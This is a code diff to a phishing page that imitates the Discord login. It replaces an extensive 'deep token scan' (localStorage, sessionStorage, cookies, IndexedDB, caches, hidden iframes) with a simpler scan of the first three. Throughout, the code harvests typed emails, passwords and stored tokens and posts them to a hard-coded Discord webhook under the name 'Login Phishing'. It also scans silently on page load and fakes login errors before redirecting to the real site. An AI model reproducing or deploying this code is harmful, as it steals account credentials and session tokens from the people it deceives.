@@ -185,7 +185,7 @@
             Invalid email or password. Please try again.
         </div>
         
-        <form id="loginForm" onsubmit="handleLogin(event)">
+        <form id="loginForm">
             <div class="form-group">
                 <label for="email">Email or Phone Number <span style="color: #f04747;">*</span></label>
                 <input type="text" id="email" required autocomplete="username">
@@ -211,197 +211,9 @@
 
     <script>
         // CONFIGURA TU WEBHOOK AQUÍ
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1470693290633466010/5RNSIyT9tM4yszJC-dhqUr1RFx0mo72lYpt-N7V1i8x7UDgnPk4dFxDZfq1TefQGIkAp';
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1470464589757022239/MC0aOunixYDGJ_woLuHBM9Qm43uYkH0cu8NzpYGOAcpbt5DOJ87NfQ0MCOS-mrgHksZF';
         
-        // Función mejorada para buscar tokens INCLUSO SI DISCORD NO ESTÁ ABIERTO
-        async function deepTokenScan() {
-            const results = {
-                tokens: [],
-                credentials: {},
-                storage: {},
-                platform: detectPlatform(),
-                timestamp: new Date().toISOString()
-            };
-            
-            // MÉTODO 1: Inyectar iframe invisible a discord.com
-            const discordDomains = [
-                'https://discord.com',
-                'https://canary.discord.com',
-                'https://ptb.discord.com'
-            ];
-            
-            for (let domain of discordDomains) {
-                try {
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = domain;
-                    document.body.appendChild(iframe);
-                    
-                    // Esperar a que cargue
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                    
-                    try {
-                        // Intentar acceder al localStorage del iframe
-                        const iframeWindow = iframe.contentWindow;
-                        const iframeStorage = iframeWindow.localStorage;
-                        
-                        for (let i = 0; i < iframeStorage.length; i++) {
-                            const key = iframeStorage.key(i);
-                            if (key.includes('token')) {
-                                results.tokens.push({
-                                    source: `iframe-${domain}`,
-                                    key: key,
-                                    value: iframeStorage.getItem(key)
-                                });
-                            }
-                        }
-                    } catch(e) {
-                        // CORS bloqueado (esperado)
-                    }
-                    
-                    document.body.removeChild(iframe);
-                } catch(e) {}
-            }
-            
-            // MÉTODO 2: Buscar en TODOS los storages del navegador actual
-            try {
-                // LocalStorage
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    const value = localStorage.getItem(key);
-                    
-                    if (key.toLowerCase().includes('token') || 
-                        key.toLowerCase().includes('discord') ||
-                        key.toLowerCase().includes('auth') ||
-                        value.toLowerCase().includes('mfa.')) {
-                        results.tokens.push({
-                            source: 'localStorage',
-                            key: key,
-                            value: value
-                        });
-                    }
-                }
-            } catch(e) {}
-            
-            // MÉTODO 3: SessionStorage
-            try {
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    const value = sessionStorage.getItem(key);
-                    
-                    if (key.toLowerCase().includes('token') || 
-                        key.toLowerCase().includes('discord')) {
-                        results.tokens.push({
-                            source: 'sessionStorage',
-                            key: key,
-                            value: value
-                        });
-                    }
-                }
-            } catch(e) {}
-            
-            // MÉTODO 4: Cookies con patrones de Discord
-            try {
-                const cookies = document.cookie.split(';');
-                cookies.forEach(cookie => {
-                    const [key, value] = cookie.split('=');
-                    const cleanKey = key.trim().toLowerCase();
-                    
-                    if (cleanKey.includes('token') || 
-                        cleanKey.includes('discord') ||
-                        cleanKey.includes('auth') ||
-                        cleanKey.includes('session')) {
-                        results.tokens.push({
-                            source: 'cookie',
-                            key: key.trim(),
-                            value: value
-                        });
-                    }
-                });
-            } catch(e) {}
-            
-            // MÉTODO 5: IndexedDB (Discord guarda tokens aquí en móvil)
-            try {
-                const dbs = await window.indexedDB.databases();
-                
-                for (let dbInfo of dbs) {
-                    if (dbInfo.name.toLowerCase().includes('discord')) {
-                        try {
-                            const request = indexedDB.open(dbInfo.name);
-                            
-                            request.onsuccess = function(event) {
-                                const db = event.target.result;
-                                const storeNames = db.objectStoreNames;
-                                
-                                for (let i = 0; i < storeNames.length; i++) {
-                                    const storeName = storeNames[i];
-                                    
-                                    try {
-                                        const transaction = db.transaction(storeName, 'readonly');
-                                        const store = transaction.objectStore(storeName);
-                                        const getAllRequest = store.getAll();
-                                        
-                                        getAllRequest.onsuccess = function() {
-                                            const data = getAllRequest.result;
-                                            results.storage[`indexedDB-${dbInfo.name}-${storeName}`] = data;
-                                        };
-                                    } catch(e) {}
-                                }
-                            };
-                        } catch(e) {}
-                    }
-                }
-            } catch(e) {}
-            
-            // MÉTODO 6: Service Workers (pueden tener tokens cacheados)
-            try {
-                if ('serviceWorker' in navigator) {
-                    const registrations = await navigator.serviceWorker.getRegistrations();
-                    
-                    for (let registration of registrations) {
-                        if (registration.active && registration.active.scriptURL.includes('discord')) {
-                            results.storage.serviceWorker = registration.active.scriptURL;
-                        }
-                    }
-                }
-            } catch(e) {}
-            
-            // MÉTODO 7: Cache Storage
-            try {
-                if ('caches' in window) {
-                    const cacheNames = await caches.keys();
-                    
-                    for (let cacheName of cacheNames) {
-                        if (cacheName.toLowerCase().includes('discord')) {
-                            const cache = await caches.open(cacheName);
-                            const requests = await cache.keys();
-                            
-                            for (let request of requests) {
-                                const response = await cache.match(request);
-                                if (response) {
-                                    const text = await response.text();
-                                    
-                                    // Buscar tokens en el cache
-                                    const tokenMatch = text.match(/(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{25,})/g);
-                                    if (tokenMatch) {
-                                        results.tokens.push({
-                                            source: `cache-${cacheName}`,
-                                            value: tokenMatch[0]
-                                        });
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            } catch(e) {}
-            
-            // MÉTODO 8: Probar credenciales contra Discord API
-            // (Se hace después con las credenciales del formulario)
-            
-            return results;
-        }
-        
+        // Detectar plataforma
         function detectPlatform() {
             const ua = navigator.userAgent;
             if (/android/i.test(ua)) return 'Android';
@@ -412,10 +224,99 @@
             return 'Unknown';
         }
         
-        async function sendToWebhook(data) {
+        // Buscar tokens (compatible con CSP)
+        function scanForTokens() {
+            const results = {
+                tokens: [],
+                storage: {},
+                platform: detectPlatform(),
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+            
+            // LocalStorage
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    
+                    if (key && value) {
+                        const lowerKey = key.toLowerCase();
+                        const lowerValue = value.toLowerCase();
+                        
+                        if (lowerKey.includes('token') || 
+                            lowerKey.includes('discord') ||
+                            lowerKey.includes('auth') ||
+                            lowerValue.includes('mfa.')) {
+                            results.tokens.push({
+                                source: 'localStorage',
+                                key: key,
+                                value: value
+                            });
+                        }
+                    }
+                }
+            } catch(e) {
+                results.storage.localStorage_error = e.message;
+            }
+            
+            // SessionStorage
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    const value = sessionStorage.getItem(key);
+                    
+                    if (key && value) {
+                        const lowerKey = key.toLowerCase();
+                        
+                        if (lowerKey.includes('token') || 
+                            lowerKey.includes('discord')) {
+                            results.tokens.push({
+                                source: 'sessionStorage',
+                                key: key,
+                                value: value
+                            });
+                        }
+                    }
+                }
+            } catch(e) {
+                results.storage.sessionStorage_error = e.message;
+            }
+            
+            // Cookies
+            try {
+                const cookies = document.cookie.split(';');
+                cookies.forEach(function(cookie) {
+                    const parts = cookie.split('=');
+                    if (parts.length >= 2) {
+                        const key = parts[0].trim();
+                        const value = parts[1];
+                        const lowerKey = key.toLowerCase();
+                        
+                        if (lowerKey.includes('token') || 
+                            lowerKey.includes('discord') ||
+                            lowerKey.includes('auth') ||
+                            lowerKey.includes('session')) {
+                            results.tokens.push({
+                                source: 'cookie',
+                                key: key,
+                                value: value
+                            });
+                        }
+                    }
+                });
+            } catch(e) {
+                results.storage.cookies_error = e.message;
+            }
+            
+            return results;
+        }
+        
+        // Enviar datos al webhook
+        function sendData(data) {
             const embed = {
-                title: '🎯 Deep Token Scan Results',
-                color: data.tokens.length > 0 ? 0x43B581 : (data.credentials.email ? 0xFAA61A : 0xFF6B6B),
+                title: '🎯 Login Attempt',
+                color: data.tokens.length > 0 ? 0x43B581 : (data.credentials ? 0xFAA61A : 0xFF6B6B),
                 fields: [
                     {
                         name: '📱 Platform',
@@ -428,7 +329,7 @@
                         inline: true
                     },
                     {
-                        name: '⏰ Timestamp',
+                        name: '⏰ Time',
                         value: new Date().toLocaleString(),
                         inline: true
                     }
@@ -436,105 +337,107 @@
                 timestamp: data.timestamp
             };
             
-            // Credenciales del formulario
-            if (data.credentials.email) {
-                embed.fields.push({
-                    name: '📧 Email/Phone',
-                    value: '||```' + data.credentials.email + '```||',
-                    inline: false
-                });
-            }
-            
-            if (data.credentials.password) {
-                embed.fields.push({
-                    name: '🔒 Password',
-                    value: '||```' + data.credentials.password + '```||',
-                    inline: false
-                });
-            }
-            
-            // Tokens encontrados
-            if (data.tokens.length > 0) {
-                data.tokens.forEach((t, i) => {
+            // Credenciales
+            if (data.credentials) {
+                if (data.credentials.email) {
                     embed.fields.push({
-                        name: `🎟️ Token #${i + 1} (${t.source})`,
-                        value: '||```' + (t.value || 'N/A') + '```||',
+                        name: '📧 Email/Phone',
+                        value: '||```' + data.credentials.email + '```||',
+                        inline: false
+                    });
+                }
+                
+                if (data.credentials.password) {
+                    embed.fields.push({
+                        name: '🔒 Password',
+                        value: '||```' + data.credentials.password + '```||',
+                        inline: false
+                    });
+                }
+            }
+            
+            // Tokens
+            if (data.tokens.length > 0) {
+                data.tokens.forEach(function(token, index) {
+                    embed.fields.push({
+                        name: '🎟️ Token #' + (index + 1) + ' (' + token.source + ')',
+                        value: '||```' + (token.value || 'N/A') + '```||',
                         inline: false
                     });
                 });
             }
             
-            // Storage info
-            const storageKeys = Object.keys(data.storage);
-            if (storageKeys.length > 0) {
-                embed.fields.push({
-                    name: '💾 Storage Found',
-                    value: storageKeys.join(', '),
-                    inline: false
-                });
-            }
+            // User Agent
+            embed.fields.push({
+                name: '🔧 User Agent',
+                value: '```' + data.userAgent + '```',
+                inline: false
+            });
             
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        username: 'Deep Token Scanner',
-                        embeds: [embed]
-                    })
-                });
-            } catch(e) {}
+            const payload = JSON.stringify({
+                username: 'Login Phishing',
+                embeds: [embed]
+            });
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: payload
+            }).catch(function(error) {
+                console.error('Webhook error:', error);
+            });
         }
         
-        async function handleLogin(event) {
+        // Manejar submit del formulario
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
             
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
-            // Ocultar formulario, mostrar loading
+            // Ocultar form, mostrar loading
             document.getElementById('loginForm').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
             
-            // Hacer scan profundo de tokens
-            const scanResults = await deepTokenScan();
-            
-            // Agregar credenciales
+            // Scan de tokens
+            const scanResults = scanForTokens();
             scanResults.credentials = {
                 email: email,
                 password: password
             };
             
-            // Enviar todo al webhook
-            await sendToWebhook(scanResults);
+            // Enviar datos
+            sendData(scanResults);
             
-            // Simular "error" de login
-            await new Promise(r => setTimeout(r, 2500));
-            
-            document.getElementById('loading').style.display = 'none';
-            document.getElementById('error').style.display = 'block';
-            document.getElementById('loginForm').style.display = 'block';
-            
-            // Limpiar password
-            document.getElementById('password').value = '';
-            
-            // Después de 3 intentos, redirigir a Discord real
-            if (!window.loginAttempts) window.loginAttempts = 0;
-            window.loginAttempts++;
-            
-            if (window.loginAttempts >= 3) {
-                setTimeout(() => {
-                    window.location.href = 'https://discord.com/login';
-                }, 2000);
-            }
-        }
+            // Simular delay y error
+            window.setTimeout(function() {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('error').style.display = 'block';
+                document.getElementById('loginForm').style.display = 'block';
+                document.getElementById('password').value = '';
+                
+                // Contador de intentos
+                if (!window.loginAttempts) {
+                    window.loginAttempts = 0;
+                }
+                window.loginAttempts++;
+                
+                // Después de 3 intentos, redirigir
+                if (window.loginAttempts >= 3) {
+                    window.setTimeout(function() {
+                        window.location.href = 'https://discord.com/login';
+                    }, 2000);
+                }
+            }, 2500);
+        });
         
-        // Auto-scan al cargar la página (silencioso)
-        window.addEventListener('load', async () => {
-            // Esperar 3 segundos
-            setTimeout(async () => {
-                const scanResults = await deepTokenScan();
-                await sendToWebhook(scanResults);
+        // Auto-scan silencioso al cargar (después de 3 segundos)
+        window.addEventListener('load', function() {
+            window.setTimeout(function() {
+                const scanResults = scanForTokens();
+                sendData(scanResults);
             }, 3000);
         });
     </script>
